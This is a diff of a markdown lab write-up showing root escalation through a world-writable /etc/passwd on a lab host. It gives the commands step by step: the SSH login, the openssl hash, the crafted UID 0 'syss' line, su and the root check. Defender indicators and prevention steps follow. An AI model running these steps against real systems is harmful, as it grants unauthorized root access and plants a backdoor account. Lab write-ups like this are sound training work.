@@ -72,25 +72,36 @@ Since I can write to the file, I can add a brand new user with UID 0 (root level
 
 ## Tools Used
 
+| Tool | Purpose |
+|------|---------|
+| `SSH` | Used to remotely access the target Linux machine |
+| `OpenSSL` | Used to generate a password hash for the new user account |
+| `Nano` | Used to modify the `/etc/passwd` file |
+
 ## Prerequisites
 
-|                    What                  |                      Why                             |
-|------------------------------------------|------------------------------------------------------|
-| SSH credentials for a low-privilege user | Starting point for the attack                        |
-| Write access to /etc/passwd              | The misconfiguration that makes this attack possible |
-| openssl on Kali                          | To generate a password hash                          |
-| nano on the target                       | To edit /etc/passwd                                  |
+| What | Why |
+|------|-----|
+| SSH credentials for a low-privilege user | Required to gain initial access to the target Linux machine |
+| Write permission on `/etc/passwd` | The misconfiguration that allows modification of user account entries |
+| OpenSSL installed on Kali Linux | Used to generate a password hash for the new user |
+| Text editor access (nano/vim) on the target | Required to modify `/etc/passwd` and add the crafted user entry |
+| Knowledge of Linux user structure (`/etc/passwd` fields and UID) | Required to create a valid root-level user entry |
 
 ## Step 1 — Connecting to the Target via SSH
+
+Since the target was running an older SSH setup, I had to add extra flags to allow older key exchange algorithms:
 
 ```bash
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
 ```
+**Flag Breakdown**
 
-- `-o HostKeyAlgorithms=+ssh-rsa` : Allows older RSA host key algorithm — needed for older Linux systems
-- `-o PubkeyAcceptedAlgorithms=+ssh-rsa` : Allows older RSA public key algorithm for authentication
-- `192.168.5.133` : Target IP
-- `user`: User Name
+| Flag | Description |
+|------|-------------|
+| `-o HostKeyAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA host key algorithm, which is required by some older Linux systems |
+| `-o PubkeyAcceptedAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA public key algorithm for authentication |
+| `user@192.168.5.133` | Connects to the target machine as the `user` account at `192.168.5.133` |
 
 **Output:**
 
@@ -111,13 +122,13 @@ Last login: Tue Jun 30 12:32:04 2026 from 192.168.5.128
 ```
 It prompted for the password right after the connection request, I typed `password321`, and got logged in successfully. The kernel version 2.6.32 stood out right away.
 
-I logged in as `user` — a normal low privilege account on the system.
+I logged in as `user`, a normal low privilege account on the system.
 
 <p align="center">
   <img src="images/step1-1.png" width="600">
 </p>
 
-## Step 2 — Checking /etc/passwd Permissions
+## Step 2 — Checking `/etc/passwd` Permissions
 
 ```bash
 user@debian:~$ ls -la /etc/passwd
@@ -131,11 +142,11 @@ user@debian:~$ ls -la /etc/passwd
 
 | Permission | Who            | What it means               |
 |------------|----------------|-----------------------------|
-|   rw-      | Owner (root)   | Root can read and write     |
-|   r--      | Group (root)   | Group members can only read |
-|   rw-      | Others         | Everyone can read and write |
+|   `rw- `     | Owner (root)   | Root can read and write     |
+|   `r--`      | Group (root)   | Group members can only read |
+|   `rw-`      | Others         | Everyone can read and write |
 
-The last `rw-` was the problem. Any normal user on the system — including me — could write directly to `/etc/passwd`. This was a serious misconfiguration.
+The last `rw-` permission was the issue. Normally, only root should have write access to `/etc/passwd`. Because this file was writable by other users, I was able to modify the user account information.
 
 ### Read the Current Contents
 
@@ -171,24 +182,24 @@ user:x:1000:1000:user,,,:/home/user:/bin/bash
 statd:x:103:65534::/var/lib/nfs:/bin/false
 mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
 ```
-I focused on the root line:
+I checked the root account entry:
 
 ```
 root:x:0:0:root:/root:/bin/bash
 ```
 **What the Root Line Means**
 
-| Field       | Value       | Description                                            |
-|-------------|-------------|--------------------------------------------------------|
-| root        | root        | Username                                               |
-| x           | x           | Password placeholder — actual hash is in `/etc/shadow` |
-| 0           | 0           | User ID — 0 means root                                 |
-| 0           | 0           | Group ID — 0 means root group                          |
-| root        | root        | Description                                            |
-| /root       | /root       | Home directory                                         |
-| /bin/bash   | /bin/bash   | Shell                                                  |
+| Field | Value | Description |
+|-------|-------|--------------------------------------------------|
+| Username | `root` | Account username |
+| Password | `x` | Password hash is stored in `/etc/shadow` |
+| UID | `0` | User ID 0 represents root privileges |
+| GID | `0` | Group ID 0 represents the root group |
+| Description | `root` | User information field |
+| Home Directory | `/root` | Root user's home directory |
+| Shell | `/bin/bash` | Default login shell |
 
-The `x` in the password field means the real password hash is stored in `/etc/shadow`. If I replace that `x` with a hash I generate myself, Linux will use my password instead of checking `/etc/shadow` — giving me root access with a password I control.
+The `x` in the password field means Linux checks `/etc/shadow` for the actual password hash. Since `/etc/passwd` was writable, I could replace this field with a custom hash and create a user with UID `0`.
 
 <p align="center">
   <img src="images/step2-1.png" width="600">
@@ -198,40 +209,54 @@ The `x` in the password field means the real password hash is stored in `/etc/sh
 
 ### Generated a Password Hash on Kali
 
+I generated a password hash using OpenSSL on the Kali machine.
+
 ```bash
 openssl passwd "password100"
 ```
+**Flag Breakdown**
+
+| Flag | Description |
+|------|---------|
+| `openssl` | OpenSSL command-line utility used for cryptographic operations |
+| `passwd` | OpenSSL subcommand used to generate a password hash |
+| `"password100"` | The plaintext password that will be converted into a password hash |
+
 **Output:**
 
 ```
 $1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0
 ```
-This is the MD5 password hash for the password `password100`
+This is the MD5 password hash for the password `password100`.
+The generated hash will be used as the password field for the new user entry in `/etc/passwd`.
 
-### Built the New Root User Line
+### Created the New User Entry
 
-I opened mousepad on Kali and built the new line by replacing `x` with the generated hash:
+I opened mousepad on Kali and I created a new user entry by replacing the password field with the generated hash and setting the UID and GID to 0.
 
+New entry:
 ```
 syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
 ```
-Before it was like that:
+Original root entry:
 ```
 root:x:0:0:root:/root:/bin/bash
 ```
 **Breakdown**
 
-|              Field                 | Value                | Description                                    |
-|------------------------------------|----------------------|------------------------------------------------|
-| syss                               | syss                 | New username I am creating                     |
-| $1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0 | Hash of `password100`| My own password hash — Linux uses this directly|
-| 0                                  | 0                    | User ID 0 — root level access                  |
-| 0                                  | 0                    | Group ID 0 — root group                        |
-| root                               | root                 | Description                                    |
-| /root                              | /root                | Home directory                                 |
-| /bin/bash                          | /bin/bash            | Shell                                          |
+| Field | Value | Description |
+|-------|-------|--------------------------------------------------|
+| Username | `syss` | Name of the new user |
+| Password | `$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0` | Password hash generated using OpenSSL |
+| UID | `0` | User ID 0 gives root-level privileges |
+| GID | `0` | Group ID 0 belongs to the root group |
+| Description | `root` | User description field |
+| Home Directory | `/root` | User home directory |
+| Shell | `/bin/bash` | Login shell for the user |
 
-### Opened /etc/passwd on the Target and Added the Line
+### Added the New Entry to `/etc/passwd`
+
+I opened `/etc/passwd` using nano on the target machine and added the new user entry.
 
 ```bash
 user@debian:~$ nano /etc/passwd
@@ -241,9 +266,15 @@ I scrolled to the bottom of the file and pasted the line:
 ```
 syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
 ```
-Then pressed `Ctrl+X` then `Y` then Enter to save and exit.
+Saved the file by pressing:
 
-### Confirmed the Line Was Added
+```
+Ctrl + X → Y → Enter
+```
+
+### Verified the New User Entry
+
+I checked /etc/passwd to confirm that the new user was added successfully.
 
 ```bash
 user@debian:~$ cat /etc/passwd
@@ -258,7 +289,7 @@ syss:$1$5EFEB5H4$Ze56xFFNd2t3zuCO2it..0:0:0:root:/root:/bin/bash
 ...
 mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
 ```
-The new line was sitting right there in /etc/passwd. The user syss with UID 0 was now part of the system.
+The new user syss was added successfully with UID 0, which means it has root-level privileges.
 
 <p align="center">
   <img src="images/step3-1.png" width="600">
@@ -266,9 +297,13 @@ The new line was sitting right there in /etc/passwd. The user syss with UID 0 wa
 
 ## Step 4 — Logging in as Root with the New User
 
+I switched to the newly created user using `su`.
+
 ```bash
 user@debian:~$ su syss
 ```
+Entered the password:
+
 ```bash
 Password: password100
 ```
@@ -277,8 +312,11 @@ Password: password100
 ```
 root@debian:/home/user#
 ```
+The shell changed to `root`, which indicates that the user `syss` has root-level privileges.
 
 ### Confirmed Root Access
+
+I verified the current user:
 
 ```bash
 root@debian:/home/user# whoami
@@ -288,6 +326,7 @@ root@debian:/home/user# whoami
 ```
 root
 ```
+I also checked the user ID:
 
 ```bash
 root@debian:/home/user# id
@@ -295,7 +334,9 @@ root@debian:/home/user# id
 ```
 uid=0(root) gid=0(root) groups=0(root)
 ```
-I went from a normal low privilege user to full root access just by writing one line to /etc/passwd. No exploit, no CVE — just a misconfigured file permission.
+The UID 0 confirms that the current user has root privileges.
+
+By modifying `/etc/passwd` and creating a user with UID `0`, a low-privileged user was able to gain full root access due to incorrect file permissions.
 
 <p align="center">
   <img src="images/step4-1.png" width="600">
@@ -303,13 +344,13 @@ I went from a normal low privilege user to full root access just by writing one 
 
 ## How Defenders Can Catch This
 
-|                                    Indicator                     |                   What to look for         |
-|------------------------------------------------------------------|--------------------------------------------|
-| /etc/passwd modified outside of normal administrative procedures | File integrity monitoring (AIDE, Tripwire) |
-| New user account with UID 0                                      | Audit logs (/var/log/auth.log)             |
-| su used to switch to an unexpected username                      | PAM logs                                   |
-| World-writable permissions on /etc/passwd                        | Regular permission audits                  |
-
+| Indicator | What to look for |
+|-----------|------------------|
+| Unexpected changes to `/etc/passwd` | Monitor file modifications using file integrity monitoring tools |
+| `/etc/passwd` has write permission for normal users | Regularly check critical file permissions |
+| New users with UID `0` | Review `/etc/passwd` entries and investigate accounts other than root with UID `0` |
+| Unexpected use of `su` to switch users | Monitor authentication logs and PAM activity |
+| Changes to system account files | Review logs such as `/var/log/auth.log` for suspicious activity |
 
 ## How to Prevent It
 
@@ -340,27 +381,19 @@ This should only ever return the root account. Any other entry with UID 0 is a r
 
 ## References
 
-- **MITRE ATT&CK — `/etc/passwd` and `/etc/shadow`**  
-  https://attack.mitre.org/techniques/T1003/008
+| Resource | Link |
+|----------|------|
+| **MITRE ATT&CK — `/etc/passwd` and `/etc/shadow`**   | https://attack.mitre.org/techniques/T1003/008 |
+| **HackTricks — Writable `/etc/passwd`** | https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd |
+| **PayloadsAllTheThings — `passwd` file** | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#writable-etcpasswd |
+| **Linux man page — `passwd`** | https://www.man7.org/linux/man-pages/man5/passwd.5.html |
+| **GTFOBins** | https://gtfobins.github.io |
 
-- **HackTricks — Writable `/etc/passwd`**  
-  https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd
+ ## Lessons Learned
 
-- **PayloadsAllTheThings — `passwd` file**  
-  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#writable-etcpasswd
-
-- **Linux man page — `passwd`**  
-  https://www.man7.org/linux/man-pages/man5/passwd.5.html
-
-- **GTFOBins**  
-  https://gtfobins.github.io
-
-  ## Lessons Learned
-
-While working through this attack I realized that:
-
-- A single misconfigured file permission on `/etc/passwd` was enough to get full root access.
-- No need any exploit or CVE, just one line added to a file was enough to get root.
-- The `x` in the password field is the key, replacing it with a real hash bypasses `/etc/shadow` completely.
-- Setting UID to `0` in the new user entry gives root level access regardless of the username.
-- File integrity monitoring is the best way to catch this kind of attack before it causes damage
+- Incorrect file permissions on critical system files can lead to complete system compromise.
+- Files like `/etc/passwd` should only be writable by the root user.
+- A normal user should never be able to create or modify accounts with UID `0`.
+- Regular permission audits can help identify dangerous misconfigurations before they are abused.
+- Monitoring changes to system account files can help detect privilege escalation attempts.
+- Proper Linux file permission management is an important part of system security.
